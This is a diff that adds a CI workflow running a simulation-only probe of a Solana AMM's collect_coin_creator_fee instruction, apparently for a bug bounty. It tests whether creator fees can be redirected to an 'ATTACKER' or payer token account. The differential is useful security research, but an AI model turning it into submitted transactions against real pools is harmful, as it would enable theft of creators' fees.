@@ -1,0 +1,103 @@
+name: collect-coin-creator-fee-redirect-runtime
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/collect-coin-creator-fee-redirect-runtime.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with: {ref: audit/boost-runtime-probe-20260815}
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token bn.js
+      - name: Simulation-only creator fee collector redirect differential
+        shell: bash
+        run: |
+          cat > collect_creator_fee.mjs <<'NODE'
+          import BN from 'bn.js';
+          import {Connection,PublicKey,Keypair,Transaction,TransactionInstruction,ComputeBudgetProgram} from '@solana/web3.js';
+          import {AccountLayout,getAssociatedTokenAddressSync,createAssociatedTokenAccountIdempotentInstruction} from '@solana/spl-token';
+          import {OnlinePumpAmmSdk,PUMP_AMM_SDK,pumpAmmJson} from '@pump-fun/pump-swap-sdk';
+
+          // Read-only / simulateTransaction only. No sendTransaction/sendRawTransaction anywhere in this harness.
+          const PROGRAM=new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA');
+          const POOL=new PublicKey('3EUUwdSpEXap46NB6n5Mmt3U8XM8vW8HPCLtJDoGzw33');
+          const PAYER=new PublicKey('39azUYFWPz3VHgKCf3VChUwbpURdCHRxjWVowf5jUJjg');
+          const ATTACKER=Keypair.generate().publicKey;
+          const RPCS=['https://rpc.solanatracker.io/public','https://api.mainnet-beta.solana.com','https://solana-rpc.publicnode.com'];
+          let id=1; const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function raw(u,m,p,n=4){let e;for(let a=0;a<n;a++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=Error('HTTP '+r.status);await sleep(250+400*a);continue}const x=await r.json();if(x.error)throw Error(JSON.stringify(x.error));return x.result}catch(x){e=x;await sleep(150)}}throw e}
+          async function call(m,p){let e;for(const u of RPCS){try{return await raw(u,m,p)}catch(x){e=x;console.log('RPC_FAIL',m,u,String(x).slice(0,180))}}throw e}
+          function tok(a){if(!a)return null;try{return AccountLayout.decode(Buffer.from(a.data[0],'base64')).amount.toString()}catch{return null}}
+          function amountFromInfo(ai){if(!ai)return null;try{return AccountLayout.decode(Buffer.from(ai.data[0],'base64')).amount.toString()}catch{return null}}
+
+          let conn=null;for(const u of RPCS){try{const c=new Connection(u,'confirmed');await c.getLatestBlockhash();conn=c;break}catch{}}if(!conn)throw Error('no rpc');
+          const sdk=new OnlinePumpAmmSdk(conn), state=await sdk.swapSolanaState(POOL,PAYER);
+
+          // Reuse a canonical buy only to recover the runtime-derived creator vault authority/ATA and event authority.
+          const built=await PUMP_AMM_SDK.buyQuoteInput(state,new BN('1000000'),5);
+          const buyDef=pumpAmmJson.instructions.find(i=>i.name==='buy');
+          const buyDisc=Buffer.from(buyDef.discriminator);
+          const buy=built.find(ix=>ix.programId.equals(PROGRAM)&&ix.data.length>=8&&Buffer.from(ix.data.subarray(0,8)).equals(buyDisc));
+          if(!buy)throw Error('canonical buy not found');
+          const buyNames=buyDef.accounts.map(a=>a.name);
+          const byName=n=>buy.keys[buyNames.indexOf(n)]?.pubkey;
+          const canonicalVault=byName('coin_creator_vault_ata');
+          const canonicalAuthority=byName('coin_creator_vault_authority');
+          const eventAuthority=byName('event_authority');
+          if(!canonicalVault||!canonicalAuthority||!eventAuthority)throw Error('canonical creator accounts unavailable');
+
+          const def=pumpAmmJson.instructions.find(i=>i.name==='collect_coin_creator_fee');
+          if(!def)throw Error('collect_coin_creator_fee absent');
+          const coinCreator=state.pool.coinCreator;
+          const canonicalDestination=getAssociatedTokenAddressSync(state.pool.quoteMint,coinCreator,true,state.quoteTokenProgram);
+          const attackerDestination=getAssociatedTokenAddressSync(state.pool.quoteMint,ATTACKER,true,state.quoteTokenProgram);
+          const payerDestination=getAssociatedTokenAddressSync(state.pool.quoteMint,PAYER,true,state.quoteTokenProgram);
+          const map={
+            quote_mint:state.pool.quoteMint,
+            quote_token_program:state.quoteTokenProgram,
+            coin_creator:coinCreator,
+            coin_creator_vault_authority:canonicalAuthority,
+            coin_creator_vault_ata:canonicalVault,
+            coin_creator_token_account:canonicalDestination,
+            event_authority:eventAuthority,
+          };
+          function make(over={}){const keys=def.accounts.map(a=>{const p=over[a.name]??map[a.name];if(!p)throw Error('missing '+a.name);return {pubkey:p,isSigner:!!a.signer,isWritable:!!a.writable}});return new TransactionInstruction({programId:PROGRAM,keys,data:Buffer.from(def.discriminator)});}
+          const cases={
+            control:make(),
+            attacker_destination_only:make({coin_creator_token_account:attackerDestination}),
+            payer_destination_only:make({coin_creator_token_account:payerDestination}),
+            attacker_coin_creator_and_destination:make({coin_creator:ATTACKER,coin_creator_token_account:attackerDestination}),
+          };
+
+          const pre=(await call('getMultipleAccounts',[[canonicalVault.toBase58(),canonicalDestination.toBase58(),attackerDestination.toBase58(),payerDestination.toBase58()],{encoding:'base64',commitment:'confirmed'}])).value;
+          console.log('META',JSON.stringify({pool:POOL.toBase58(),quoteMint:state.pool.quoteMint.toBase58(),quoteTokenProgram:state.quoteTokenProgram.toBase58(),coinCreator:coinCreator.toBase58(),canonicalAuthority:canonicalAuthority.toBase58(),canonicalVault:canonicalVault.toBase58(),canonicalDestination:canonicalDestination.toBase58(),attacker:ATTACKER.toBase58(),attackerDestination:attackerDestination.toBase58(),payerDestination:payerDestination.toBase58(),collectorAccounts:def.accounts.map(a=>({name:a.name,w:!!a.writable,s:!!a.signer,pda:!!a.pda,relations:a.relations??[]})),pre:{vault:amountFromInfo(pre[0]),canonicalDest:amountFromInfo(pre[1]),attackerDest:amountFromInfo(pre[2]),payerDest:amountFromInfo(pre[3])}},null,2));
+
+          const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value.blockhash;
+          async function sim(name,ix){
+            const setup=[
+              createAssociatedTokenAccountIdempotentInstruction(PAYER,canonicalDestination,coinCreator,state.pool.quoteMint,state.quoteTokenProgram),
+              createAssociatedTokenAccountIdempotentInstruction(PAYER,attackerDestination,ATTACKER,state.pool.quoteMint,state.quoteTokenProgram),
+              createAssociatedTokenAccountIdempotentInstruction(PAYER,payerDestination,PAYER,state.pool.quoteMint,state.quoteTokenProgram),
+            ];
+            const tx=new Transaction({feePayer:PAYER,recentBlockhash:bh}).add(ComputeBudgetProgram.setComputeUnitLimit({units:600000}),...setup,ix);
+            const bytes=tx.serialize({requireAllSignatures:false,verifySignatures:false});
+            const watch=[canonicalVault,canonicalDestination,attackerDestination,payerDestination];
+            let v=null;for(const u of RPCS){try{v=(await raw(u,'simulateTransaction',[bytes.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}],3)).value;break}catch(e){console.log('SIM_FAIL',name,u,String(e).slice(0,180))}}
+            if(!v)return {rpc:'fail'};
+            const a=v.accounts??[],l=v.logs??[];
+            const out={err:v.err,units:v.unitsConsumed,amounts:{vault:tok(a[0]),canonicalDest:tok(a[1]),attackerDest:tok(a[2]),payerDest:tok(a[3])},anchor:l.filter(x=>x.includes('AnchorError')||x.includes('Error Code:')),failed:l.filter(x=>x.includes('failed:')),instructions:l.filter(x=>x.includes('Instruction:'))};
+            console.log('CASE',name,JSON.stringify(out,null,2));
+            if(v.err)for(const x of l)console.log('ERRLOG',name,x);
+            return out;
+          }
+          const out={};for(const [n,ix] of Object.entries(cases))out[n]=await sim(n,ix);
+          console.log('DECISIVE',JSON.stringify(out,null,2));
+          NODE
+          node collect_creator_fee.mjs
